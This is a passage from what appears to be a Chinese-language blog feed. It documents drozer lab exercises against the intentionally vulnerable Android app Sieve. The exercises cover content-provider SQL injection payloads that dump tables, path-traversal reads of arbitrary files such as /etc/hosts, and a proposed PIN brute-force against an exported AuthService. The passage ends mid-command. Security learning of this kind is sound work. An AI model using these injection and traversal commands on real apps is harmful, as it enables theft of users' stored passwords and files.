&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email ddd@eee.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>delete
只剩下最一開始我們設定的data
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sqli
如下結果所示，的確存在sqli，並且可以得到完整的table
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 先嘗試丟一些trash byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;)&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM Passwords WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>我們也可以用drozer自動幫我們找
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accessible tables &lt;span style="color:#66d9ef">for&lt;/span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> android_metadata
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Key
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - content providers exported - File SystemBased</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---file-systembased">
 Test Sieve - content providers exported - File SystemBased
 &lt;a class="anchor" href="#test-sieve---content-providers-exported---file-systembased">#&lt;/a>
&lt;/h1>
&lt;ol>
&lt;li>有關於基於File System的Content Provider - 逆向
在&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>中可以特別注意onCreate以及ParcelFileDescriptor這個funnction
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FileBackupProvider&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> ContentProvider {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.FileBackupProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>, DATABASE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> ParcelFileDescriptor &lt;span style="color:#a6e22e">openFile&lt;/span>(Uri uri, String mode) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> modeCode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 268435456;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rw&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rwt&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">w&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;Unrecognised code to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> mode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ParcelFileDescriptor.&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> File(uri.&lt;span style="color:#a6e22e">getPath&lt;/span>()), modeCode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (FileNotFoundException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">e&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;ERROR: unable to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> e.&lt;span style="color:#a6e22e">getMessage&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>實際讀取文件或是Path Traversal
為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;this is secret file&amp;#34;&lt;/span> &amp;gt; /storage/emulated/0/Download/secret.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>this is secret file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>127.0.0.1 localhost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>::1 ip6-localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以利用drozer自動找尋path traversal的漏洞在哪裡
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.traversal -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Vulnerable Providers:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - is debuggable</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</guid><description>&lt;h1 id="test-sieve---is-debuggable">
 Test Sieve - is debuggable
 &lt;a class="anchor" href="#test-sieve---is-debuggable">#&lt;/a>
&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.debuggable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10286&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10285&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.withsecure.dz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10284&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test Sieve - services exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</guid><description>&lt;h1 id="test-sieve---services-exported">
 Test Sieve - services exported
 &lt;a class="anchor" href="#test-sieve---services-exported">#&lt;/a>
&lt;/h1>
&lt;ol>
&lt;li>列出exported services有哪些
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.AuthService
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.CryptoService
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>逆向
從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service，
在&lt;code>com.mwr.example.sieve.AuthService&lt;/code>中的其中一段就是有問題的地方:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AuthService&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Service {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MessageHandler&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Handler {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handleMessage&lt;/span>(Message msg) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (msg.&lt;span style="color:#a6e22e">what&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> 4:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> AuthService.&lt;span style="color:#a6e22e">MSG_CHECK&lt;/span> &lt;span style="color:#75715e">/* 2354 */&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_KEY&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 42;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyKey&lt;/span>(recievedString)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">showNotification&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_PIN&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 41;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString2 &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PIN&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyPin&lt;/span>(recievedString2)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Bundle();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle.&lt;span style="color:#a6e22e">putString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>, AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">getKey&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendUnrecognisedMessage();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendResponseMessage(5, responseCode3, returnVal2, returnBundle);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的&lt;code>com.mwr.example.sieve.PIN&lt;/code>的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵&lt;code>com.mwr.example.sieve.PASSWORD&lt;/code>以及我們之前設定的password，並且回傳response message給我們
→[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&amp;lt;password&amp;gt;}]
而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了&lt;/li>
&lt;li>和service互動
從下面的結果來看，一開始設定的密碼為==123456acitseccom==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg &lt;span style="color:#ae81ff">2354&lt;/span> &lt;span style="color:#ae81ff">9234&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> --extra string com.mwr.example.sieve.PIN &amp;lt;User PIN&amp;gt; --bundle-as-obj
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
